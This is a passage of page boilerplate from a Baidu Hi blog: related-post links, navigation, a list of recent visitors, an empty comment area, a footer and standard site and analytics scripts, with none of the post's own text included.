class=relate-img alt="[zz]2011.confidence" title="[zz]2011.confidence"> </a> <a href="http://hi.baidu.com/hi_heige/item/da06a0cc38681d3945941643" target=_blank class="relate-txt qing-stat-nsclick" data-nsclick=m_20121105_detail_relates_txt>[zz]2011.confidence</a>   </ul> </div>   <div class="mod-detail-pager clearfix">  <div class=detail-nav-pre> <a href="http://hi.baidu.com/hi_heige/item/ce8cce926dede4f428164746" hidefocus title="上一篇"></a> </div>   <div class=detail-nav-next> <a href="http://hi.baidu.com/hi_heige/item/a26d5d26088ad41009750843" hidefocus title="下一篇"></a> </div>  </div>   <div id=commentDetail class="mod-comment-detail clearfix mod-cs-comment">   <div class=mod-recent-readers> <h3 class=recent-readers-title>本文最近访客</h3> <ul class="readers-list clearfix">    <li  class=first > <a target=_blank href="http://hi.baidu.com/k401x"> <img src="http://hiphotos.baidu.com/space/scrop%3D65%3Bq%3D100/sign%3Dd4c1ceae8701a18bf4b55510ee12313d/80cb39dbb6fd52668f037496ab18972bd4073603.jpg" title="k401x" alt="k401x" class=portrait> </a> <a target=_blank href="http://hi.baidu.com/k401x" class=user-name title="k401x"> k401x </a> <div class=visit-time data-visit-time="1400058275"></div>      <li > <a target=_blank href="http://hi.baidu.com/jiaozhu"> <img src="http://hiphotos.baidu.com/space/scrop%3D65%3Bq%3D100/sign%3D1fa5b9b0d42a283447f871542b88ffdf/060828381f30e924c765359c4c086e061c95f75e.jpg" title="54nb" alt="54nb" class=portrait> </a> <a target=_blank href="http://hi.baidu.com/jiaozhu" class=user-name title="54nb"> 54nb </a> <div class=visit-time data-visit-time="1399452668"></div>      <li > <a target=_blank href="http://hi.baidu.com/xiaozhao522"> <img src="http://hiphotos.baidu.com/space/scrop%3D65%3Bq%3D100/sign%3Db5f3c58c6b600c33f42799976a71673a/dbb44aed2e738bd46d8cb4a9a18b87d6267ff9fd.jpg" title="xiaozhao522" alt="xiaozhao522" class=portrait> </a> <a target=_blank href="http://hi.baidu.com/xiaozhao522" class=user-name title="xiaozhao522"> xiaozhao522 </a> <div class=visit-time data-visit-time="1399278390"></div>      <li > <a target=_blank href="http://hi.baidu.com/andriond"> <img src="http://hiphotos.baidu.com/space/scrop%3D65%3Bq%3D100/sign%3Db427dbb9c93d70cf48a4ed5288e1e735/9a504fc2d56285352ec45ba190ef76c6a7ef630e.jpg" title="firwind" alt="firwind" class=portrait> </a> <a target=_blank href="http://hi.baidu.com/andriond" class=user-name title="firwind"> firwind </a> <div class=visit-time data-visit-time="1398345767"></div>      <li > <a target=_blank href="http://hi.baidu.com/f4ust"> <img src="http://hiphotos.baidu.com/space/scrop%3D65%3Bq%3D100/sign%3Dd7e56dc58535e5dd9472e28006fb91da/500fd9f9d72a6059bd0a6c8d2834349b033bba0b.jpg" title="丶流灬浪丨" alt="丶流灬浪丨" class=portrait> </a> <a target=_blank href="http://hi.baidu.com/f4ust" class=user-name title="丶流灬浪丨"> 丶流灬浪丨 </a> <div class=visit-time data-visit-time="1398241789"></div>      <li > <a target=_blank href="http://hi.baidu.com/tongrsec"> <img src="http://hiphotos.baidu.com/space/scrop%3D65%3Bq%3D100/sign%3D51fcf5b0070828386c539b4bc8a49f34/0824ab18972bd40743798d527b899e510eb309e6.jpg" title="JWTong_R" alt="JWTong_R" class=portrait> </a> <a target=_blank href="http://hi.baidu.com/tongrsec" class=user-name title="JWTong_R"> JWTong_R </a> <div class=visit-time data-visit-time="1394780935"></div>      <li > <a target=_blank href="http://hi.baidu.com/shangrilawyx"> <img src="http://hiphotos.baidu.com/space/scrop%3D65%3Bq%3D100/sign%3Dc421ed2ca9773912c078c23e8824b02d/9345d688d43f879496e0e3bfd21b0ef41bd53a07.jpg" title="shangrilawyx" alt="shangrilawyx" class=portrait> </a> <a target=_blank href="http://hi.baidu.com/shangrilawyx" class=user-name title="shangrilawyx"> shangrilawyx </a> <div class=visit-time data-visit-time="1394628307"></div>      <li > <a target=_blank href="http://hi.baidu.com/jockere"> <img src="http://hiphotos.baidu.com/space/scrop%3D65%3Bq%3D100/sign%3Df83b03913a292df5939deb4acc0c6a55/3bf33a87e950352aaa89e3b65343fbf2b3118ba0.jpg" title="yvlf" alt="yvlf" class=portrait> </a> <a target=_blank href="http://hi.baidu.com/jockere" class=user-name title="yvlf"> yvlf </a> <div class=visit-time data-visit-time="1390202950"></div>    </ul> </div>  <div class=comment-title>评论</div> <div class=comment-content></div> </div>   </div>  </div>  </div> </div> </section>  <footer class="mod-footer mod-cs-footer"><div class="clearfix hidden-box"></div><div class=footer-box><div class=inner-box><a href=http://help.baidu.com/question?prod_en=hi target=_blank>帮助中心</a><span>&nbsp;|&nbsp;</span><a href=http://tieba.baidu.com/p/1781683739 target=_blank>空间客服</a><span>&nbsp;|&nbsp;</span><a href=http://tousu.baidu.com/hi/add target=_blank>投诉中心</a><span>&nbsp;|&nbsp;</span><a href=http://www.baidu.com/search/hi_contract.html target=_blank>空间协议</a></div><div class=copy-box>&copy;2015&nbsp;Baidu</div></div></footer>  <script src="http://hi.bdimg.com/static/qbase/js/mod/mod_foot.js?v=382c615f.js"></script> <script>
        	qing.dom.ready(function(){
                if (qVisitorInfo.loginStatus == 'activated'){
                    qext.stat.ns('m_20121012_loga_num');
					qext.fn.setStoken();
				}
			});
        </script>        <script>qext.stat.ns('m_20120425_n0001');</script>  <script src="http://hi.bdimg.com/static/qcomment/js/qcmt_import.js?v=ac96f988.js"></script>  <script src="http://hi.bdimg.com/static/qpublish/js/editor/shCore.js?v=805e084f.js"></script> <script>
        SyntaxHighlighter.highlight();
    </script>   <script src="http://hi.bdimg.com/static/qhome/js/detail/20001/detail.js?v=3d7781df.js"></script>   <script>wpo.tti=new Date*1;</script><script src="http://hi.baidu.com/cm/static/js/allsite.js?v=75674092.js?v=201504141523"></script><script>document.write(unescape("%3Cscript src='http://hm.baidu.com/h.js%3F8c869b543955d43e496c2efee5b55823' type='text/javascript'%3E%3C/script%3E"));qext.stat.ns('m_20120713_qing_pv');</script>